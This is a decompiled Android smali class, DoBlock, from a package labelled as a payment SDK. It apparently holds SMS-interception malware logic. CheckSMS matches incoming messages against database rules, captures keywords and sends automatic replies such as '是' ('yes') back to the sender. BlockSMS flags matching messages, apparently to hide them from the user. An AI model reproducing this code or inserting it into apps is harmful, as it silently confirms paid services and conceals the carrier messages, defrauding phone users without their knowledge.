.class public Lcom/cynosure/paymentsdk/purchase/DoBlock;
.super Ljava/lang/Object;
.source "DoBlock.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 23
    return-void
.end method

.method private CheckSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 21
    .param p1, "Send"    # Ljava/lang/String;
    .param p2, "Content"    # Ljava/lang/String;

    .prologue
    .line 32
    :try_start_0
    new-instance v6, Lcom/cynosure/paymentsdk/helper/DBHelper;

    invoke-direct {v6}, Lcom/cynosure/paymentsdk/helper/DBHelper;-><init>()V

    .line 33
    .local v6, "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    invoke-virtual {v6}, Lcom/cynosure/paymentsdk/helper/DBHelper;->getReplyInfo()Ljava/util/ArrayList;

    move-result-object v3

    .line 35
    .local v3, "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    if-eqz v3, :cond_0

    .line 38
    const/4 v12, 0x0

    .local v12, "kkk":I
    :goto_0
    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v19

    move/from16 v0, v19

    if-lt v12, v0, :cond_1

    .line 122
    .end local v3    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v12    # "kkk":I
    :cond_0
    :goto_1
    return-void

    .line 40
    .restart local v3    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .restart local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .restart local v12    # "kkk":I
    :cond_1
    invoke-virtual {v3, v12}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v19

    check-cast v19, Lcom/cynosure/paymentsdk/vo/Block;

    invoke-virtual/range {v19 .. v19}, Lcom/cynosure/paymentsdk/vo/Block;->getReplyInfo()Ljava/lang/String;

    move-result-object v19

    const-string v20, "\\~\\~\\~"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v13

    .line 41
    .local v13, "replyList":[Ljava/lang/String;
    const/4 v8, 0x0

    .local v8, "i":I
    :goto_2
    array-length v0, v13

    move/from16 v19, v0

    move/from16 v0, v19

    if-lt v8, v0, :cond_2

    .line 38
    add-int/lit8 v12, v12, 0x1

    goto :goto_0

    .line 42
    :cond_2
    aget-object v18, v13, v8

    .line 43
    .local v18, "tempReplyInfo":Ljava/lang/String;
    const/4 v9, 0x0

    .line 44
    .local v9, "isNeedSave":Z
    const/4 v10, 0x0

    .line 46
    .local v10, "key":Ljava/lang/String;
    const-string v19, "<--"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v19

    if-eqz v19, :cond_3

    .line 47
    const-string v19, "<--"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v17

    .line 48
    .local v17, "tempIndex":I
    const/16 v19, 0x0

    move-object/from16 v0, v18

    move/from16 v1, v19

    move/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    .line 49
    invoke-static {v10}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v19

    if-nez v19, :cond_3

    .line 50
    const/4 v9, 0x1

    .line 51
    add-int/lit8 v19, v17, 0x3

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v18

    .line 55
    .end local v17    # "tempIndex":I
    :cond_3
    const-string v19, "-->"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v19

    if-eqz v19, :cond_5

    .line 57
    const-string v19, "\\-\\-\\>"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    array-length v0, v0

    move/from16 v19, v0

    const/16 v20, 0x3

    move/from16 v0, v19

    move/from16 v1, v20

    if-ne v0, v1, :cond_5

    .line 58
    const-string v19, "\\-\\-\\>"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x0

    aget-object v4, v19, v20

    .line 59
    .local v4, "checkNumber":Ljava/lang/String;
    const-string v19, "\\-\\-\\>"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v5, v19, v20

    .line 60
    .local v5, "checkWord":Ljava/lang/String;
    const-string v19, "\\-\\-\\>"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v14, v19, v20

    .line 63
    .local v14, "replyWord":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v1, v4}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->checkPhoneNumber(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_5

    .line 65
    invoke-static {v5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 66
    const-string v19, "null"

    move-object/from16 v0, v19

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_8

    .line 68
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1, v5}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->getKeyWord(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 69
    .local v11, "keyWord":Ljava/lang/String;
    invoke-static {v11}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 71
    if-eqz v9, :cond_4

    .line 72
    new-instance v16, Lcom/cynosure/paymentsdk/helper/SharedPreferencesHelper;

    invoke-static {}, Lcom/cynosure/paymentsdk/CoreContext;->getInstance()Lcom/cynosure/paymentsdk/CoreContext;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Lcom/cynosure/paymentsdk/CoreContext;->getContext()Landroid/content/Context;

    move-result-object v19

    move-object/from16 v0, v16

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/cynosure/paymentsdk/helper/SharedPreferencesHelper;-><init>(Landroid/content/Context;)V

    .line 73
    .local v16, "spHelper":Lcom/cynosure/paymentsdk/helper/SharedPreferencesHelper;
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "CheckSMS:"

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-static/range {v19 .. v19}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printD(Ljava/lang/String;)V

    .line 74
    move-object/from16 v0, v16

    invoke-virtual {v0, v10, v11}, Lcom/cynosure/paymentsdk/helper/SharedPreferencesHelper;->setSharedPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 77
    .end local v16    # "spHelper":Lcom/cynosure/paymentsdk/helper/SharedPreferencesHelper;
    :cond_4
    invoke-static {v14}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 78
    const-string v19, "null"

    move-object/from16 v0, v19

    invoke-virtual {v14, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 80
    const-string v19, "wordinsms"

    move-object/from16 v0, v19

    invoke-virtual {v14, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_6

    .line 81
    new-instance v15, Lcom/cynosure/paymentsdk/helper/SMSHelper;

    invoke-direct {v15}, Lcom/cynosure/paymentsdk/helper/SMSHelper;-><init>()V

    .line 82
    .local v15, "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    const-string v19, "reply"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    invoke-virtual {v15, v0, v11, v1}, Lcom/cynosure/paymentsdk/helper/SMSHelper;->sendTextSMS(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    .line 41
    .end local v4    # "checkNumber":Ljava/lang/String;
    .end local v5    # "checkWord":Ljava/lang/String;
    .end local v11    # "keyWord":Ljava/lang/String;
    .end local v14    # "replyWord":Ljava/lang/String;
    .end local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    :cond_5
    :goto_3
    add-int/lit8 v8, v8, 0x1

    goto/16 :goto_2

    .line 84
    .restart local v4    # "checkNumber":Ljava/lang/String;
    .restart local v5    # "checkWord":Ljava/lang/String;
    .restart local v11    # "keyWord":Ljava/lang/String;
    .restart local v14    # "replyWord":Ljava/lang/String;
    :cond_6
    const-string v19, "shenmedouxing"

    move-object/from16 v0, v19

    invoke-virtual {v14, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_7

    .line 85
    new-instance v15, Lcom/cynosure/paymentsdk/helper/SMSHelper;

    invoke-direct {v15}, Lcom/cynosure/paymentsdk/helper/SMSHelper;-><init>()V

    .line 86
    .restart local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    const-string v19, "\u662f"

    const-string v20, "reply"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-virtual {v15, v0, v1, v2}, Lcom/cynosure/paymentsdk/helper/SMSHelper;->sendTextSMS(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    .line 119
    .end local v3    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .end local v4    # "checkNumber":Ljava/lang/String;
    .end local v5    # "checkWord":Ljava/lang/String;
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v8    # "i":I
    .end local v9    # "isNeedSave":Z
    .end local v10    # "key":Ljava/lang/String;
    .end local v11    # "keyWord":Ljava/lang/String;
    .end local v12    # "kkk":I
    .end local v13    # "replyList":[Ljava/lang/String;
    .end local v14    # "replyWord":Ljava/lang/String;
    .end local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    .end local v18    # "tempReplyInfo":Ljava/lang/String;
    :catch_0
    move-exception v7

    .line 120
    .local v7, "e":Ljava/lang/Exception;
    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_1

    .line 89
    .end local v7    # "e":Ljava/lang/Exception;
    .restart local v3    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .restart local v4    # "checkNumber":Ljava/lang/String;
    .restart local v5    # "checkWord":Ljava/lang/String;
    .restart local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .restart local v8    # "i":I
    .restart local v9    # "isNeedSave":Z
    .restart local v10    # "key":Ljava/lang/String;
    .restart local v11    # "keyWord":Ljava/lang/String;
    .restart local v12    # "kkk":I
    .restart local v13    # "replyList":[Ljava/lang/String;
    .restart local v14    # "replyWord":Ljava/lang/String;
    .restart local v18    # "tempReplyInfo":Ljava/lang/String;
    :cond_7
    :try_start_1
    new-instance v15, Lcom/cynosure/paymentsdk/helper/SMSHelper;

    invoke-direct {v15}, Lcom/cynosure/paymentsdk/helper/SMSHelper;-><init>()V

    .line 90
    .restart local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    const-string v19, "reply"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    invoke-virtual {v15, v0, v14, v1}, Lcom/cynosure/paymentsdk/helper/SMSHelper;->sendTextSMS(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_3

    .line 98
    .end local v11    # "keyWord":Ljava/lang/String;
    .end local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    :cond_8
    invoke-static {v14}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 99
    const-string v19, "null"

    move-object/from16 v0, v19

    invoke-virtual {v14, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_5

    .line 100
    const-string v19, "shenmedouxing"

    move-object/from16 v0, v19

    invoke-virtual {v14, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_9

    .line 101
    new-instance v15, Lcom/cynosure/paymentsdk/helper/SMSHelper;

    invoke-direct {v15}, Lcom/cynosure/paymentsdk/helper/SMSHelper;-><init>()V

    .line 102
    .restart local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    const-string v19, "\u662f"

    const-string v20, "reply"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-virtual {v15, v0, v1, v2}, Lcom/cynosure/paymentsdk/helper/SMSHelper;->sendTextSMS(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_3

    .line 105
    .end local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    :cond_9
    new-instance v15, Lcom/cynosure/paymentsdk/helper/SMSHelper;

    invoke-direct {v15}, Lcom/cynosure/paymentsdk/helper/SMSHelper;-><init>()V

    .line 106
    .restart local v15    # "smsHelper":Lcom/cynosure/paymentsdk/helper/SMSHelper;
    const-string v19, "reply"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    invoke-virtual {v15, v0, v14, v1}, Lcom/cynosure/paymentsdk/helper/SMSHelper;->sendTextSMS(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3
.end method

.method private checkPhoneNumber(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 5
    .param p1, "Send"    # Ljava/lang/String;
    .param p2, "CheckNumber"    # Ljava/lang/String;

    .prologue
    const/4 v3, 0x0

    .line 168
    :try_start_0
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    invoke-static {p2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 169
    invoke-static {p2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v2

    .line 170
    .local v2, "pattern":Ljava/util/regex/Pattern;
    invoke-virtual {v2, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    .line 171
    .local v1, "matcher":Ljava/util/regex/Matcher;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    if-eqz v4, :cond_0

    .line 172
    const/4 v3, 0x1

    .line 184
    .end local v1    # "matcher":Ljava/util/regex/Matcher;
    .end local v2    # "pattern":Ljava/util/regex/Pattern;
    :cond_0
    :goto_0
    return v3

    .line 182
    :catch_0
    move-exception v0

    .line 183
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private getKeyWord(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p1, "Content"    # Ljava/lang/String;
    .param p2, "CheckWord"    # Ljava/lang/String;

    .prologue
    const/4 v3, 0x0

    .line 191
    :try_start_0
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    invoke-static {p2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 192
    invoke-static {p2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v2

    .line 193
    .local v2, "pattern":Ljava/util/regex/Pattern;
    invoke-virtual {v2, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    .line 194
    .local v1, "matcher":Ljava/util/regex/Matcher;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 195
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 207
    .end local v1    # "matcher":Ljava/util/regex/Matcher;
    .end local v2    # "pattern":Ljava/util/regex/Pattern;
    :cond_0
    :goto_0
    return-object v3

    .line 205
    :catch_0
    move-exception v0

    .line 206
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public BlockSMS(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 10
    .param p1, "Send"    # Ljava/lang/String;
    .param p2, "Content"    # Ljava/lang/String;

    .prologue
    .line 125
    const/4 v7, 0x0

    .line 130
    .local v7, "returnvalue":Z
    :try_start_0
    new-instance v3, Lcom/cynosure/paymentsdk/helper/DBHelper;

    invoke-direct {v3}, Lcom/cynosure/paymentsdk/helper/DBHelper;-><init>()V

    .line 131
    .local v3, "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    invoke-virtual {v3}, Lcom/cynosure/paymentsdk/helper/DBHelper;->getBlockInfo()Ljava/util/ArrayList;

    move-result-object v0

    .line 133
    .local v0, "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    if-eqz v0, :cond_0

    .line 135
    const/4 v5, 0x0

    .local v5, "i":I
    :goto_0
    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v8

    if-lt v5, v8, :cond_1

    .line 162
    .end local v0    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .end local v3    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v5    # "i":I
    :cond_0
    :goto_1
    return v7

    .line 137
    .restart local v0    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .restart local v3    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .restart local v5    # "i":I
    :cond_1
    invoke-virtual {v0, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Lcom/cynosure/paymentsdk/vo/Block;

    invoke-virtual {v8}, Lcom/cynosure/paymentsdk/vo/Block;->getBlockNumber()Ljava/lang/String;

    move-result-object v8

    const-string v9, "\\~\\~\\~"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 138
    .local v1, "blockNumberList":[Ljava/lang/String;
    const/4 v6, 0x0

    .local v6, "k":I
    :goto_2
    array-length v8, v1

    if-lt v6, v8, :cond_2

    .line 147
    :goto_3
    invoke-virtual {v0, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Lcom/cynosure/paymentsdk/vo/Block;

    invoke-virtual {v8}, Lcom/cynosure/paymentsdk/vo/Block;->getBlockContent()Ljava/lang/String;

    move-result-object v8

    const-string v9, "\\~\\~\\~"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 148
    .local v2, "blockWordList":[Ljava/lang/String;
    const/4 v6, 0x0

    :goto_4
    array-length v8, v2

    if-lt v6, v8, :cond_4

    .line 135
    :goto_5
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 139
    .end local v2    # "blockWordList":[Ljava/lang/String;
    :cond_2
    aget-object v8, v1, v6

    invoke-static {v8}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_3

    .line 140
    aget-object v8, v1, v6

    invoke-direct {p0, p1, v8}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->checkPhoneNumber(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_3

    .line 141
    const/4 v7, 0x1

    .line 142
    goto :goto_3

    .line 138
    :cond_3
    add-int/lit8 v6, v6, 0x1

    goto :goto_2

    .line 149
    .restart local v2    # "blockWordList":[Ljava/lang/String;
    :cond_4
    aget-object v8, v2, v6

    invoke-static {v8}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_5

    .line 150
    aget-object v8, v2, v6

    invoke-direct {p0, p2, v8}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->getKeyWord(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v8

    if-nez v8, :cond_5

    .line 151
    const/4 v7, 0x1

    .line 152
    goto :goto_5

    .line 148
    :cond_5
    add-int/lit8 v6, v6, 0x1

    goto :goto_4

    .line 159
    .end local v0    # "blockInfoList":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/cynosure/paymentsdk/vo/Block;>;"
    .end local v1    # "blockNumberList":[Ljava/lang/String;
    .end local v2    # "blockWordList":[Ljava/lang/String;
    .end local v3    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v5    # "i":I
    .end local v6    # "k":I
    :catch_0
    move-exception v4

    .line 160
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public doBlock(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 1
    .param p1, "Send"    # Ljava/lang/String;
    .param p2, "Content"    # Ljava/lang/String;

    .prologue
    .line 26
    invoke-direct {p0, p1, p2}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->CheckSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 27
    invoke-virtual {p0, p1, p2}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->BlockSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    return v0
.end method
